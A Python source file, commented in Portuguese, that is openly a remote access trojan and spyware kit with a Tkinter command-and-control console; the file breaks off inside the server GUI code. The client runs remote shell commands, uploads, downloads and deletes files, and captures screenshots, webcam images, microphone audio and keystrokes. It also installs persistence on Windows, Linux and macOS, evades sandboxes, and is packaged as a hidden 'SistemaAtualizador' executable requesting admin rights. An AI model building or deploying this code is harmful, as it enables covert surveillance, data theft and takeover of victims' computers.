#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAT COMPLETO - SPYWARE COM JANELA SEPARADA E CONTROLE REMOTO
Conexão Persistente + GUI + Janela de Monitor com Controle
Uso: python rat.py
"""

import os
import sys
import time
import json
import socket
import subprocess
import threading
import base64
import platform
import getpass
import tempfile
import shutil
import importlib
from datetime import datetime
from io import BytesIO

# ===================================================================
# IMPORTAÇÕES TKINTER
# ===================================================================
try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox, filedialog
    TKINTER_DISPONIVEL = True
except ImportError:
    TKINTER_DISPONIVEL = False
    print("[!] Tkinter não disponível")

# ===================================================================
# CORES
# ===================================================================
class Cores:
    VERMELHO = '\033[91m'
    VERDE = '\033[92m'
    AMARELO = '\033[93m'
    AZUL = '\033[94m'
    CIANO = '\033[96m'
    BRANCO = '\033[97m'
    NEGRITO = '\033[1m'
    RESET = '\033[0m'

# ===================================================================
# CONFIGURAÇÃO
# ===================================================================
C2_SERVER = "127.0.0.1"
C2_PORT = 4444
BEACON_INTERVAL = 60
ENCRYPT_KEY = b"chave_simetrica_32_bytes_1234567890"
MAX_RETRIES = 999
TIMEOUT = 60

# ===================================================================
# BOOTSTRAP
# ===================================================================
DEPENDENCIAS = [
    'pillow', 'mss', 'opencv-python', 'pynput', 
    'psutil', 'pyaudio', 'cryptography', 'pyinstaller'
]

def instalar_dependencias():
    print(f"{Cores.AZUL}[*] Instalando dependências...{Cores.RESET}")
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], capture_output=True)
    for dep in DEPENDENCIAS:
        try:
            importlib.import_module(dep.replace('-', '_'))
            print(f"{Cores.VERDE}[OK] {dep}{Cores.RESET}")
        except ImportError:
            print(f"{Cores.AMARELO}[*] Instalando {dep}...{Cores.RESET}")
            subprocess.run([sys.executable, "-m", "pip", "install", dep], capture_output=True)
    print(f"{Cores.VERDE}[OK] Todas as dependências instaladas!{Cores.RESET}")

def gerar_exe():
    print(f"{Cores.AZUL}[*] Gerando executável...{Cores.RESET}")
    script = os.path.abspath(__file__)
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole",
        "--name", "SistemaAtualizador",
        "--clean", "--noconfirm", "--strip",
        script
    ]
    if sys.platform == 'win32':
        cmd.extend(["--uac-admin"])
    resultado = subprocess.run(cmd, capture_output=True, text=True)
    if resultado.returncode == 0:
        exe_path = os.path.join(os.path.dirname(script), "dist", "SistemaAtualizador.exe")
        if os.path.exists(exe_path):
            print(f"{Cores.VERDE}[OK] EXE criado: {exe_path}{Cores.RESET}")
            return exe_path
    print(f"{Cores.VERMELHO}[ERRO] Falha ao gerar EXE{Cores.RESET}")
    return None

# ===================================================================
# CONEXÃO C2
# ===================================================================
class ConexaoC2:
    def __init__(self):
        self.socket = None
        self.conectado = False
        self.lock = threading.Lock()
    
    def conectar(self):
        with self.lock:
            tentativas = 0
            while not self.conectado:
                try:
                    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.socket.settimeout(TIMEOUT)
                    self.socket.connect((C2_SERVER, C2_PORT))
                    self.conectado = True
                    return True
                except:
                    tentativas += 1
                    time.sleep(2)
            return False
    
    def enviar(self, dados):
        if not self.conectado:
            return False
        try:
            with self.lock:
                if isinstance(dados, dict):
                    dados = json.dumps(dados)
                self.socket.send(dados.encode() + b'\n')
                return True
        except:
            self.conectado = False
            return False
    
    def receber(self):
        if not self.conectado:
            return None
        try:
            with self.lock:
                dados = self.socket.recv(8192).decode().strip()
                if not dados:
                    self.conectado = False
                    return None
                try:
                    return json.loads(dados)
                except:
                    return dados
        except:
            self.conectado = False
            return None
    
    def fechar(self):
        with self.lock:
            self.conectado = False
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass
                self.socket = None

# ===================================================================
# MÓDULOS DO RAT
# ===================================================================
def executar_comando(cmd):
    try:
        if platform.system() == 'Windows':
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, executable='/bin/bash')
        saida, erro = p.communicate(timeout=60)
        if erro:
            return f"[ERRO] {erro.decode('utf-8', errors='ignore')}"
        return saida.decode('utf-8', errors='ignore')
    except subprocess.TimeoutExpired:
        p.kill()
        return "[ERRO] Timeout"
    except Exception as e:
        return f"[ERRO] {str(e)}"

def listar_arquivos(caminho="."):
    try:
        itens = os.listdir(caminho)
        resultado = []
        for item in itens:
            caminho_completo = os.path.join(caminho, item)
            tipo = "DIR" if os.path.isdir(caminho_completo) else "FILE"
            tamanho = os.path.getsize(caminho_completo) if os.path.isfile(caminho_completo) else 0
            resultado.append({"nome": item, "tipo": tipo, "tamanho": tamanho, "caminho": caminho_completo})
        return json.dumps(resultado)
    except Exception as e:
        return f"[ERRO] {str(e)}"

def baixar_arquivo(caminho):
    try:
        with open(caminho, 'rb') as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        return f"[ERRO] {str(e)}"

def upload_arquivo(caminho, dados_base64):
    try:
        with open(caminho, 'wb') as f:
            f.write(base64.b64decode(dados_base64))
        return f"[OK] Arquivo salvo: {caminho}"
    except Exception as e:
        return f"[ERRO] {str(e)}"

def deletar_arquivo(caminho):
    try:
        if os.path.isdir(caminho):
            shutil.rmtree(caminho)
        else:
            os.remove(caminho)
        return f"[OK] {caminho} deletado"
    except Exception as e:
        return f"[ERRO] {str(e)}"

def renomear_arquivo(antigo, novo):
    try:
        os.rename(antigo, novo)
        return f"[OK] {antigo} -> {novo}"
    except Exception as e:
        return f"[ERRO] {str(e)}"

def capturar_tela():
    try:
        import PIL.ImageGrab
        import io
        img = PIL.ImageGrab.grab()
        buffer = io.BytesIO()
        img.save(buffer, format='JPEG', quality=60)
        return base64.b64encode(buffer.getvalue()).decode()
    except:
        try:
            import mss
            import PIL.Image
            with mss.mss() as sct:
                shot = sct.grab(sct.monitors[1])
                img = PIL.Image.frombytes("RGB", shot.size, shot.rgb)
                buffer = io.BytesIO()
                img.save(buffer, format='JPEG', quality=60)
                return base64.b64encode(buffer.getvalue()).decode()
        except:
            return "[ERRO] Screenshot não disponível"

def capturar_webcam():
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            return "[ERRO] Webcam não encontrada"
        ret, frame = cam.read()
        cam.release()
        if not ret:
            return "[ERRO] Falha ao capturar"
        _, buffer = cv2.imencode('.jpg', frame)
        return base64.b64encode(buffer).decode()
    except:
        return "[ERRO] Webcam não disponível"

def gravar_audio(duracao=10):
    try:
        import pyaudio
        import wave
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE / CHUNK * duracao)):
            frames.append(stream.read(CHUNK))
        stream.stop_stream(); stream.close(); p.terminate()
        with tempfile.NamedTemporaryFile(delete=False, suffix='.wav') as f:
            wf = wave.open(f.name, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            with open(f.name, 'rb') as audio_file:
                dados = audio_file.read()
            os.unlink(f.name)
            return base64.b64encode(dados).decode()
    except Exception as e:
        return f"[ERRO] {str(e)}"

class Keylogger:
    def __init__(self):
        self.teclas = []
        self.ativo = False
        self.thread = None
        self.lock = threading.Lock()
    
    def iniciar(self):
        with self.lock:
            if self.ativo:
                return "[OK] Keylogger já rodando"
            self.ativo = True
            self.teclas = []
            self.thread = threading.Thread(target=self._loop, daemon=True)
            self.thread.start()
            return "[OK] Keylogger iniciado"
    
    def parar(self):
        with self.lock:
            self.ativo = False
            if self.thread:
                self.thread.join(timeout=3)
            dados = ''.join(self.teclas)
            self.teclas = []
            return dados if dados else "[OK] Nenhuma tecla capturada"
    
    def _loop(self):
        try:
            from pynput import keyboard
            def on_press(key):
                if not self.ativo:
                    return False
                try:
                    if hasattr(key, 'char') and key.char is not None:
                        with self.lock:
                            self.teclas.append(key.char)
                    else:
                        nome = str(key).replace('Key.', '')
                        if nome == 'space':
                            with self.lock:
                                self.teclas.append(' ')
                        elif nome == 'enter':
                            with self.lock:
                                self.teclas.append('\n')
                        elif nome == 'backspace':
                            with self.lock:
                                if self.teclas:
                                    self.teclas.pop()
                        else:
                            with self.lock:
                                self.teclas.append(f'[{nome}]')
                except:
                    pass
            
            with keyboard.Listener(on_press=on_press) as listener:
                while self.ativo:
                    time.sleep(0.1)
                listener.stop()
        except Exception as e:
            with self.lock:
                self.teclas.append(f"[ERRO] {str(e)}")

def instalar_persistencia():
    script_path = os.path.abspath(sys.argv[0])
    sistema = platform.system()
    if sistema == 'Windows':
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "AtualizadorSistema", 0, winreg.REG_SZ, script_path)
            return "[OK] Persistência no Windows"
        except:
            return "[ERRO] Falha na persistência"
    elif sistema == 'Linux':
        try:
            with open(os.path.expanduser("~/.bashrc"), 'a') as f:
                f.write(f"\npython3 {script_path} &\n")
            with open(os.path.expanduser("~/cron.tmp"), 'w') as f:
                f.write(f"@reboot python3 {script_path} &\n")
            os.system("crontab ~/cron.tmp 2>/dev/null")
            os.unlink(os.path.expanduser("~/cron.tmp"))
            return "[OK] Persistência no Linux"
        except:
            return "[ERRO] Falha na persistência"
    elif sistema == 'Darwin':
        try:
            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.sistema.atualizador</string>
    <key>ProgramArguments</key>
    <array><string>python3</string><string>{script_path}</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>"""
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.sistema.atualizador.plist")
            with open(plist_path, 'w') as f:
                f.write(plist)
            os.system(f"launchctl load {plist_path}")
            return "[OK] Persistência no macOS"
        except:
            return "[ERRO] Falha na persistência"
    return "[ERRO] Sistema não suportado"

def coletar_info():
    info = {
        'sistema': platform.system(), 'versao': platform.version(),
        'release': platform.release(), 'arquitetura': platform.machine(),
        'hostname': socket.gethostname(), 'usuario': getpass.getuser(),
        'ip_local': socket.gethostbyname(socket.gethostname()),
        'python': sys.version, 'cwd': os.getcwd(),
        'cpu_count': os.cpu_count()
    }
    try:
        import psutil
        info['memoria_total'] = f"{psutil.virtual_memory().total / (1024**3):.1f} GB"
        info['cpu_uso'] = f"{psutil.cpu_percent()}%"
    except:
        pass
    return json.dumps(info)

def verificar_sandbox():
    if platform.system() == 'Windows':
        try:
            import psutil
            suspeitos = ['vmtoolsd.exe', 'vboxservice.exe', 'procmon.exe', 'wireshark.exe']
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() in [s.lower() for s in suspeitos]:
                    return True
        except:
            pass
    if time.time() - os.path.getctime(sys.argv[0]) < 300:
        return True
    return False

# ===================================================================
# CONTROLE REMOTO
# ===================================================================
class ControleRemoto:
    @staticmethod
    def mover_mouse(x, y):
        try:
            if platform.system() == 'Windows':
                import ctypes
                ctypes.windll.user32.SetCursorPos(int(x), int(y))
                return "[OK] Mouse movido"
            else:
                os.system(f"xdotool mousemove {int(x)} {int(y)}")
                return "[OK] Mouse movido"
        except:
            return "[ERRO] Falha ao mover mouse"
    
    @staticmethod
    def clicar_mouse(btn='left'):
        try:
            if platform.system() == 'Windows':
                import ctypes
                if btn == 'left':
                    ctypes.windll.user32.mouse_event(0x0002, 0, 0, 0, 0)
                    ctypes.windll.user32.mouse_event(0x0004, 0, 0, 0, 0)
                elif btn == 'right':
                    ctypes.windll.user32.mouse_event(0x0008, 0, 0, 0, 0)
                    ctypes.windll.user32.mouse_event(0x0010, 0, 0, 0, 0)
                return "[OK] Clique"
            else:
                os.system(f"xdotool click {'1' if btn == 'left' else '3'}")
                return "[OK] Clique"
        except:
            return "[ERRO] Falha ao clicar"
    
    @staticmethod
    def click_duplo():
        try:
            if platform.system() == 'Windows':
                import ctypes
                for _ in range(2):
                    ctypes.windll.user32.mouse_event(0x0002, 0, 0, 0, 0)
                    ctypes.windll.user32.mouse_event(0x0004, 0, 0, 0, 0)
                    time.sleep(0.05)
                return "[OK] Clique duplo"
            else:
                os.system("xdotool click --repeat 2 1")
                return "[OK] Clique duplo"
        except:
            return "[ERRO] Falha no clique duplo"
    
    @staticmethod
    def scroll(delta):
        try:
            if platform.system() == 'Windows':
                import ctypes
                ctypes.windll.user32.mouse_event(0x0800, 0, 0, int(delta * 120), 0)
                return "[OK] Scroll"
            else:
                os.system(f"xdotool click {'4' if delta > 0 else '5'}")
                return "[OK] Scroll"
        except:
            return "[ERRO] Falha no scroll"
    
    @staticmethod
    def enviar_tecla(tecla):
        try:
            if platform.system() == 'Windows':
                import ctypes
                for char in tecla:
                    ctypes.windll.user32.keybd_event(ord(char.upper()), 0, 0, 0)
                    time.sleep(0.01)
                    ctypes.windll.user32.keybd_event(ord(char.upper()), 0, 0x0002, 0)
                return "[OK] Tecla enviada"
            else:
                os.system(f"xdotool type '{tecla}'")
                return "[OK] Tecla enviada"
        except:
            return "[ERRO] Falha ao enviar tecla"
    
    @staticmethod
    def enviar_tecla_especial(tecla):
        try:
            VK_CODES = {
                'enter': 0x0D, 'esc': 0x1B, 'backspace': 0x08,
                'tab': 0x09, 'space': 0x20, 'delete': 0x2E,
                'up': 0x26, 'down': 0x28, 'left': 0x25, 'right': 0x27,
                'home': 0x24, 'end': 0x23, 'pageup': 0x21, 'pagedown': 0x22,
                'f1': 0x70, 'f2': 0x71, 'f3': 0x72, 'f4': 0x73,
                'f5': 0x74, 'f6': 0x75, 'f7': 0x76, 'f8': 0x77,
                'f9': 0x78, 'f10': 0x79, 'f11': 0x7A, 'f12': 0x7B
            }
            if platform.system() == 'Windows':
                import ctypes
                if tecla.lower() in VK_CODES:
                    code = VK_CODES[tecla.lower()]
                    ctypes.windll.user32.keybd_event(code, 0, 0, 0)
                    time.sleep(0.05)
                    ctypes.windll.user32.keybd_event(code, 0, 0x0002, 0)
                    return f"[OK] Tecla {tecla} enviada"
                return f"[ERRO] Tecla {tecla} não reconhecida"
            else:
                os.system(f"xdotool key {tecla}")
                return f"[OK] Tecla {tecla} enviada"
        except:
            return "[ERRO] Falha ao enviar tecla especial"

# ===================================================================
# CLIENTE RAT
# ===================================================================
class RAT:
    def __init__(self):
        self.conexao = ConexaoC2()
        self.rodando = True
        self.keylogger = Keylogger()
        self.lock = threading.Lock()
        self.modulos = {
            'shell': lambda a: executar_comando(a) if a else "[ERRO] Comando vazio",
            'ls': lambda a: listar_arquivos(a if a else "."),
            'download': lambda a: baixar_arquivo(a) if a else "[ERRO] Caminho não fornecido",
            'upload': lambda a: upload_arquivo(a.split(',')[0], a.split(',')[1]) if a and ',' in a else "[ERRO] Formato: caminho,base64",
            'delete': lambda a: deletar_arquivo(a) if a else "[ERRO] Caminho não fornecido",
            'rename': lambda a: renomear_arquivo(a.split(',')[0], a.split(',')[1]) if a and ',' in a else "[ERRO] Formato: antigo,novo",
            'screenshot': lambda a: capturar_tela(),
            'webcam': lambda a: capturar_webcam(),
            'microphone': lambda a: gravar_audio(int(a) if a and a.isdigit() else 10),
            'keylogger_start': lambda a: self.keylogger.iniciar(),
            'keylogger_stop': lambda a: self.keylogger.parar(),
            'info': lambda a: coletar_info(),
            'persist': lambda a: instalar_persistencia(),
            'ping': lambda a: "[OK] Pong!",
            'mover_mouse': lambda a: ControleRemoto.mover_mouse(*map(int, a.split(','))) if a and ',' in a else "[ERRO] Formato: x,y",
            'clicar': lambda a: ControleRemoto.clicar_mouse(a if a else 'left'),
            'click_duplo': lambda a: ControleRemoto.click_duplo(),
            'scroll': lambda a: ControleRemoto.scroll(int(a) if a else 1),
            'tecla': lambda a: ControleRemoto.enviar_tecla(a) if a else "[ERRO] Tecla não fornecida",
            'tecla_especial': lambda a: ControleRemoto.enviar_tecla_especial(a) if a else "[ERRO] Tecla não fornecida",
            'exit': lambda a: self._sair()
        }
    
    def _sair(self):
        self.rodando = False
        return "[OK] Encerrando..."
    
    def processar(self, comando):
        if isinstance(comando, dict):
            cmd = comando.get('comando', '')
        else:
            cmd = comando
        cmd = cmd.strip()
        if not cmd:
            return "[OK] Comando vazio"
        partes = cmd.split(' ', 1)
        nome = partes[0].lower()
        args = partes[1] if len(partes) > 1 else ''
        if nome in self.modulos:
            return self.modulos[nome](args)
        return f"[ERRO] Comando desconhecido: {nome}"
    
    def _heartbeat(self):
        while self.rodando:
            time.sleep(30)
            if self.conexao.conectado:
                try:
                    self.conexao.enviar({'tipo': 'heartbeat', 'timestamp': time.time()})
                except:
                    pass
    
    def rodar(self):
        if verificar_sandbox():
            print(f"{Cores.AMARELO}[!] Ambiente suspeito, aguardando...{Cores.RESET}")
            time.sleep(60)
        
        print(f"{Cores.VERDE}[*] RAT iniciado{Cores.RESET}")
        heartbeat_thread = threading.Thread(target=self._heartbeat, daemon=True)
        heartbeat_thread.start()
        
        while self.rodando:
            if not self.conexao.conectar():
                time.sleep(5)
                continue
            
            print(f"{Cores.VERDE}[+] Conectado ao C2{Cores.RESET}")
            self.conexao.enviar({
                'tipo': 'beacon',
                'hostname': socket.gethostname(),
                'usuario': getpass.getuser(),
                'sistema': platform.system(),
                'ip': socket.gethostbyname(socket.gethostname())
            })
            
            while self.rodando and self.conexao.conectado:
                try:
                    comando = self.conexao.receber()
                    if comando is None:
                        break
                    
                    if isinstance(comando, dict) and comando.get('tipo') == 'heartbeat':
                        self.conexao.enviar({'tipo': 'heartbeat_ack', 'timestamp': time.time()})
                        continue
                    
                    try:
                        resultado = self.processar(comando)
                        self.conexao.enviar({
                            'tipo': 'resposta',
                            'comando': comando if isinstance(comando, str) else comando.get('comando', ''),
                            'resultado': resultado
                        })
                    except Exception as e:
                        self.conexao.enviar({'tipo': 'erro', 'erro': str(e)})
                        
                except socket.timeout:
                    continue
                except:
                    break
            
            self.conexao.fechar()
            time.sleep(5)

# ===================================================================
# JANELA DE SPYWARE SEPARADA
# ===================================================================
class JanelaSpyware:
    def __init__(self, master, id_cliente, enviar_e_receber_func):
        self.master = master
        self.id_cliente = id_cliente
        self.enviar_e_receber = enviar_e_receber_func
        self.monitor_ativo = True
        self.monitor_thread = None
        self.monitor_photo = None
        self.monitor_imagem_id = None
        self.monitor_frame_count = 0
        self.monitor_fps = 0
        self.monitor_last_time = time.time()
        self.tamanho_tela = (1920, 1080)  # Assume resolução padrão
        self.ultima_imagem = None
        
        # Cria a janela
        self.janela = tk.Toplevel(master)
        self.janela.title(f"🕵️ Spyware - {id_cliente}")
        self.janela.geometry("1024x700")
        self.janela.configure(bg='#1a1a2e')
        self.janela.protocol("WM_DELETE_WINDOW", self.fechar)
        
        # Frame de controles
        control_frame = ttk.Frame(self.janela)
        control_frame.pack(fill='x', padx=5, pady=5)
        
        # Botões
        ttk.Button(control_frame, text="⏹ Parar", command=self.fechar).pack(side='left', padx=2)
        ttk.Button(control_frame, text="📸 Salvar", command=self.salvar_frame).pack(side='left', padx=2)
        
        # Qualidade
        tk.Label(control_frame, text="Qualidade:", fg='#e0e0e0', bg='#1a1a2e').pack(side='left', padx=(20,5))
        self.qualidade_var = tk.StringVar(value="50")
        ttk.Entry(control_frame, textvariable=self.qualidade_var, width=5).pack(side='left', padx=5)
        
        # FPS
        tk.Label(control_frame, text="FPS:", fg='#e0e0e0', bg='#1a1a2e').pack(side='left', padx=(10,5))
        self.fps_var = tk.StringVar(value="5")
        ttk.Entry(control_frame, textvariable=self.fps_var, width=5).pack(side='left', padx=5)
        
        # Status
        self.status_label = tk.Label(control_frame, text="🟢 ATIVO", 
                                     font=('Arial', 10, 'bold'), fg='#51cf66', bg='#1a1a2e')
        self.status_label.pack(side='left', padx=20)
        
        self.fps_label = tk.Label(control_frame, text="FPS: 0", 
                                  font=('Arial', 9), fg='#888', bg='#1a1a2e')
        self.fps_label.pack(side='left', padx=10)
        
        # Canvas para imagem
        self.canvas = tk.Canvas(self.janela, bg='#0a0a1a', highlightthickness=1, 
                                highlightbackground='#333')
        self.canvas.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Bind de eventos do MOUSE para controle remoto
        self.canvas.bind('<Button-1>', self.on_mouse_click)
        self.canvas.bind('<Button-3>', self.on_mouse_right_click)
        self.canvas.bind('<Button-4>', lambda e: self.on_mouse_scroll(e, 1))
        self.canvas.bind('<Button-5>', lambda e: self.on_mouse_scroll(e, -1))
        self.canvas.bind('<Double-Button-1>', self.on_mouse_double_click)
        self.canvas.bind('<Motion>', self.on_mouse_move)
        
        # Bind de teclado
        self.canvas.bind('<Key>', self.on_key_press)
        self.canvas.focus_set()
        
        # Mensagem inicial
        self.canvas.create_text(512, 350, text="🕵️ Spyware ATIVO\nMonitorando em tempo real...\nAguardando primeira imagem",
                               fill='#555', font=('Arial', 14), anchor='center')
        
        # Inicia thread de monitor
        self.monitor_thread = threading.Thread(target=self._loop_monitor, daemon=True)
        self.monitor_thread.start()
        
        # Atualiza FPS na interface
        self._atualizar_fps_label()
    
    def _loop_monitor(self):
        """Loop de captura contínua"""
        try:
            fps = int(self.fps_var.get())
            if fps < 1:
                fps = 1
            if fps > 15:
                fps = 15
        except:
            fps = 5
        
        try:
            qualidade = int(self.qualidade_var.get())
            if qualidade < 10:
                qualidade = 10
            if qualidade > 100:
                qualidade = 100
        except:
            qualidade = 50
        
        while self.monitor_ativo:
            try:
                inicio = time.time()
                
                # Captura tela
                resultado = self.enviar_e_receber(self.id_cliente, "screenshot")
                
                if resultado and not resultado.startswith('[ERRO]'):
                    try:
                        dados = base64.b64decode(resultado)
                        self.ultima_imagem = dados
                        
                        # Converte para imagem
                        from PIL import Image
                        img = Image.open(BytesIO(dados))
                        
                        # Obtém tamanho da tela para referência
                        self.tamanho_tela = img.size
                        
                        # Redimensiona
                        canvas_width = self.canvas.winfo_width()
                        canvas_height = self.canvas.winfo_height()
                        
                        if canvas_width > 10 and canvas_height > 10:
                            img_width, img_height = img.size
                            ratio = min(canvas_width / img_width, canvas_height / img_height)
                            new_width = int(img_width * ratio * 0.95)
                            new_height = int(img_height * ratio * 0.95)
                            img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                            
                            # Converte para PhotoImage
                            from PIL import ImageTk
                            self.monitor_photo = ImageTk.PhotoImage(img)
                            
                            # Atualiza FPS
                            self.monitor_frame_count += 1
                            agora = time.time()
                            if agora - self.monitor_last_time >= 1:
                                self.monitor_fps = self.monitor_frame_count
                                self.monitor_frame_count = 0
                                self.monitor_last_time = agora
                                # Atualiza label FPS
                                self.janela.after(0, lambda: self.fps_label.config(text=f"FPS: {self.monitor_fps}"))
                            
                            # Atualiza canvas
                            self.janela.after(0, self._atualizar_canvas)
                    except Exception as e:
                        pass
                
                # Calcula tempo de espera
                elapsed = time.time() - inicio
                sleep_time = max(0, (1.0 / fps) - elapsed)
                if sleep_time > 0:
                    time.sleep(sleep_time)
                
            except Exception as e:
                time.sleep(0.5)
                continue
    
    def _atualizar_canvas(self):
        """Atualiza a imagem no canvas"""
        if self.monitor_photo and self.monitor_ativo:
            if self.monitor_imagem_id:
                self.canvas.delete(self.monitor_imagem_id)
            self.monitor_imagem_id = self.canvas.create_image(
                self.canvas.winfo_width() // 2,
                self.canvas.winfo_height() // 2,
                image=self.monitor_photo, anchor='center'
            )
    
    def _atualizar_fps_label(self):
        """Atualiza label de FPS periodicamente"""
        if self.monitor_ativo:
            self.fps_label.config(text=f"FPS: {self.monitor_fps}")
            self.janela.after(1000, self._atualizar_fps_label)
    
    # ================================================================
    # CONTROLE REMOTO - MOUSE
    # ================================================================
    def get_mouse_coords(self, event):
        """Converte coordenadas do canvas para coordenadas da tela"""
        if not self.monitor_photo:
            return (0, 0)
        
        canvas_width = self.canvas.winfo_width()
        canvas_height = self.canvas.winfo_height()
        img_width = self.monitor_photo.width()
        img_height = self.monitor_photo.height()
        
        offset_x = (canvas_width - img_width) // 2
        offset_y = (canvas_height - img_height) // 2
        
        # Usa a resolução real da tela do cliente
        tela_w, tela_h = self.tamanho_tela
        
        x = int((event.x - offset_x) * (tela_w / img_width))
        y = int((event.y - offset_y) * (tela_h / img_height))
        
        x = max(0, min(tela_w - 1, x))
        y = max(0, min(tela_h - 1, y))
        
        return (x, y)
    
    def on_mouse_move(self, event):
        if not self.monitor_ativo:
            return
        x, y = self.get_mouse_coords(event)
        threading.Thread(target=lambda: self.enviar_e_receber(self.id_cliente, f"mover_mouse {x},{y}"), daemon=True).start()
    
    def on_mouse_click(self, event):
        if not self.monitor_ativo:
            return
        x, y = self.get_mouse_coords(event)
        # Move primeiro
        self.enviar_e_receber(self.id_cliente, f"mover_mouse {x},{y}")
        # Depois clica
        threading.Thread(target=lambda: self.enviar_e_receber(self.id_cliente, "clicar left"), daemon=True).start()
    
    def on_mouse_right_click(self, event):
        if not self.monitor_ativo:
            return
        x, y = self.get_mouse_coords(event)
        self.enviar_e_receber(self.id_cliente, f"mover_mouse {x},{y}")
        threading.Thread(target=lambda: self.enviar_e_receber(self.id_cliente, "clicar right"), daemon=True).start()
    
    def on_mouse_double_click(self, event):
        if not self.monitor_ativo:
            return
        x, y = self.get_mouse_coords(event)
        self.enviar_e_receber(self.id_cliente, f"mover_mouse {x},{y}")
        threading.Thread(target=lambda: self.enviar_e_receber(self.id_cliente, "click_duplo"), daemon=True).start()
    
    def on_mouse_scroll(self, event, delta):
        if not self.monitor_ativo:
            return
        threading.Thread(target=lambda: self.enviar_e_receber(self.id_cliente, f"scroll {delta}"), daemon=True).start()
    
    # ================================================================
    # CONTROLE REMOTO - TECLADO
    # ================================================================
    def on_key_press(self, event):
        if not self.monitor_ativo:
            return
        
        tecla = event.keysym
        
        teclas_especiais = {
            'Return': 'enter', 'Escape': 'esc', 'BackSpace': 'backspace',
            'Tab': 'tab', 'space': 'space', 'Delete': 'delete',
            'Up': 'up', 'Down': 'down', 'Left': 'left', 'Right': 'right',
            'Home': 'home', 'End': 'end', 'Page_Up': 'pageup', 'Page_Down': 'pagedown',
            'F1': 'f1', 'F2': 'f2', 'F3': 'f3', 'F4': 'f4',
            'F5': 'f5', 'F6': 'f6', 'F7': 'f7', 'F8': 'f8',
            'F9': 'f9', 'F10': 'f10', 'F11': 'f11', 'F12': 'f12'
        }
        
        if tecla in teclas_especiais:
            threading.Thread(target=lambda: self.enviar_e_receber(self.id_cliente, f"tecla_especial {teclas_especiais[tecla]}"), daemon=True).start()
        elif len(tecla) == 1:
            threading.Thread(target=lambda: self.enviar_e_receber(self.id_cliente, f"tecla {tecla}"), daemon=True).start()
    
    # ================================================================
    # SALVAR FRAME
    # ================================================================
    def salvar_frame(self):
        if not self.ultima_imagem:
            messagebox.showwarning("Aviso", "Nenhuma imagem disponível!")
            return
        
        try:
            from PIL import Image
            from io import BytesIO
            
            img = Image.open(BytesIO(self.ultima_imagem))
            nome = f"spyware_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            salvar = filedialog.asksaveasfilename(defaultextension=".jpg", initialfile=nome)
            if salvar:
                img.save(salvar, 'JPEG', quality=90)
                messagebox.showinfo("Sucesso", f"Frame salvo: {salvar}")
        except Exception as e:
            messagebox.showerror("Erro", f"Falha ao salvar: {e}")
    
    # ================================================================
    # FECHAR
    # ================================================================
    def fechar(self):
        self.monitor_ativo = False
        self.janela.destroy()

# ===================================================================
# SERVIDOR C2
# ===================================================================
class ServidorC2GUI:
    def __init__(self):
        self.clientes = {}
        self.clientes_info = {}
        self.selecionado = None
        self.rodando = True
        self.server_thread = None
        self.janelas_spyware = []
        
        # Janela principal
        self.root = tk.Tk()
        self.root.title("RAT C2 - Sistema de Controle Remoto")
        self.root.geometry("1200x750")
        self.root.configure(bg='#1a1a2e')
        
        # Estilo
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TFrame', background='#1a1a2e')
        self.style.configure('TLabel', background='#1a1a2e', foreground='#e0e0e0')
        self.style.configure('TButton', background='#16213e', foreground='#e0e0e0', borderwidth=0)
        self.style.map('TButton', background=[('active', '#0f3460')])
        self.style.configure('TNotebook', background='#1a1a2e', borderwidth=0)
        self.style.configure('TNotebook.Tab', background='#16213e', foreground='#e0e0e0', padding=[10, 5])
        self.style.map('TNotebook.Tab', background=[('selected', '#0f3460')])
        self.style.configure('Treeview', background='#16213e', foreground='#e0e0e0', fieldbackground='#16213e')
        self.style.map('Treeview', background=[('selected', '#0f3460')])
        
        self.criar_widgets()
        
    def criar_widgets(self):
        # Topo
        top_frame = ttk.Frame(self.root)
        top_frame.pack(fill='x', padx=10, pady=5)
        
        titulo = tk.Label(top_frame, text="🔴 RAT C2 - SPYWARE VIVO", 
                         font=('Arial', 16, 'bold'), fg='#e94560', bg='#1a1a2e')
        titulo.pack(side='left')
        
        self.status_label = tk.Label(top_frame, text="⚠️ Servidor parado", 
                                     font=('Arial', 10), fg='#ff6b6b', bg='#1a1a2e')
        self.status_label.pack(side='right', padx=10)
        
        btn_frame = ttk.Frame(top_frame)
        btn_frame.pack(side='right', padx=10)
        
        self.btn_iniciar = ttk.Button(btn_frame, text="▶ Iniciar Servidor", command=self.iniciar_servidor)
        self.btn_iniciar.pack(side='left', padx=2)
        
